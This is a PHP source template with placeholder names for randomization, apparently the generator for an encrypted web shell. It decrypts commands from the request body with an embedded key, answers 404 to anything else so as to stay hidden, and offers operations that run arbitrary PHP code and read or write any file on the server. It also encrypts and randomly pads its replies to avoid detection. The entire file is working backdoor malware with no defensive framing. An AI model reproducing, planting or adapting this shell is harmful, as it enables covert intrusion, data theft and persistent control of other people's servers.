<?php
${{.VKey}} = base64_decode('{{.KeyB64}}');
${{.VMethods}} = openssl_get_cipher_methods();
${{.VMode}} = in_array('aes-256-gcm', ${{.VMethods}}, true) ? 'gcm' : 'cbc';

function {{.FDec}}($k, $m, $b64) {
    $raw = base64_decode($b64, true);
    if ($raw === false || strlen($raw) < 12 + 16 + 1) { return false; }
    if ($m === 'gcm') {
        $iv  = substr($raw, 0, 12);
        $tag = substr($raw, -16);
        $ct  = substr($raw, 12, -16);
        $pt  = openssl_decrypt($ct, 'aes-256-gcm', $k, OPENSSL_RAW_DATA, $iv, $tag);
        return $pt === false ? false : $pt;
    }
    if (strlen($raw) < 16 + 32 + 1) { return false; }
    $iv  = substr($raw, 0, 16);
    $mac = substr($raw, -32);
    $ct  = substr($raw, 16, -32);
    $km  = hash('sha256', $k . 'artex-mac-v1', true);
    if (!hash_equals($mac, hash_hmac('sha256', $iv . $ct, $km, true))) { return false; }
    $ke = hash('sha256', $k . 'artex-enc-v1', true);
    $pt = openssl_decrypt($ct, 'aes-256-cbc', $ke, OPENSSL_RAW_DATA, $iv);
    return $pt === false ? false : $pt;
}

function {{.FEnc}}($k, $m, $pt) {
    if ($m === 'gcm') {
        $iv  = random_bytes(12);
        $tag = '';
        $ct  = openssl_encrypt($pt, 'aes-256-gcm', $k, OPENSSL_RAW_DATA, $iv, $tag);
        return base64_encode($iv . $ct . $tag);
    }
    $iv  = random_bytes(16);
    $ke  = hash('sha256', $k . 'artex-enc-v1', true);
    $ct  = openssl_encrypt($pt, 'aes-256-cbc', $ke, OPENSSL_RAW_DATA, $iv);
    $km  = hash('sha256', $k . 'artex-mac-v1', true);
    $mac = hash_hmac('sha256', $iv . $ct, $km, true);
    return base64_encode($iv . $ct . $mac);
}

function {{.FFrame}}($p) {
    $n = random_int(0, 64);
    return chr($n) . ($n > 0 ? random_bytes($n) : '') . $p;
}
function {{.FUnframe}}($f) {
    if (strlen($f) < 1) { return false; }
    $n = ord($f[0]);
    if (strlen($f) < 1 + $n) { return false; }
    return substr($f, 1 + $n);
}

${{.VResp}} = array('ok' => false, 'out' => '', 'err' => '', 'mode' => ${{.VMode}});
${{.VPlain}} = {{.FDec}}(${{.VKey}}, ${{.VMode}}, file_get_contents('php://input'));
if (${{.VPlain}} === false) {
    http_response_code(404);
    exit;
}
{
    ${{.VJson}} = {{.FUnframe}}(${{.VPlain}});
    ${{.VReq}} = (${{.VJson}} === false) ? null : json_decode(${{.VJson}}, true);
    if (!is_array(${{.VReq}})) {
        ${{.VResp}}['err'] = 'bad frame';
    } else {
        ${{.VOp}} = isset(${{.VReq}}['op']) ? ${{.VReq}}['op'] : '';
        if (${{.VOp}} === 'probe') {
            ${{.VResp}}['ok'] = true;
            ${{.VResp}}['out'] = isset(${{.VReq}}['s']) ? ${{.VReq}}['s'] : '';
        } elseif (${{.VOp}} === 'exec') {
            ${{.VCode}} = base64_decode(isset(${{.VReq}}['code']) ? ${{.VReq}}['code'] : '', true);
            ob_start();
            ${{.VTmp}} = tempnam(sys_get_temp_dir(), 'sess');
            try {
                if (${{.VTmp}} === false || file_put_contents(${{.VTmp}}, "<?php " . (${{.VCode}} === false ? '' : ${{.VCode}})) === false) {
                    ${{.VResp}}['err'] = 'exec: temp write failed';
                } else {
                    include ${{.VTmp}};
                    ${{.VResp}}['ok'] = true;
                }
            } catch (Throwable ${{.VT}}) {
                ${{.VResp}}['err'] = 'exec: ' . ${{.VT}}->getMessage();
            }
            @unlink(${{.VTmp}});
            ${{.VResp}}['out'] = base64_encode(ob_get_clean());
        } elseif (${{.VOp}} === 'read') {
            ${{.VData}} = @file_get_contents(base64_decode(isset(${{.VReq}}['path']) ? ${{.VReq}}['path'] : ''));
            if (${{.VData}} === false) { ${{.VResp}}['err'] = 'read failed'; }
            else { ${{.VResp}}['ok'] = true; ${{.VResp}}['out'] = base64_encode(${{.VData}}); }
        } elseif (${{.VOp}} === 'write') {
            ${{.VFlag}} = (isset(${{.VReq}}['app']) && ${{.VReq}}['app'] === '1') ? FILE_APPEND : 0;
            ${{.VR}} = @file_put_contents(
                base64_decode(isset(${{.VReq}}['path']) ? ${{.VReq}}['path'] : ''),
                base64_decode(isset(${{.VReq}}['data']) ? ${{.VReq}}['data'] : ''),
                ${{.VFlag}});
            if (${{.VR}} === false) { ${{.VResp}}['err'] = 'write failed'; }
            else { ${{.VResp}}['ok'] = true; }
        } else {
            ${{.VResp}}['err'] = 'unknown op';
        }
    }
}
echo {{.FEnc}}(${{.VKey}}, ${{.VMode}}, {{.FFrame}}(json_encode(${{.VResp}})));
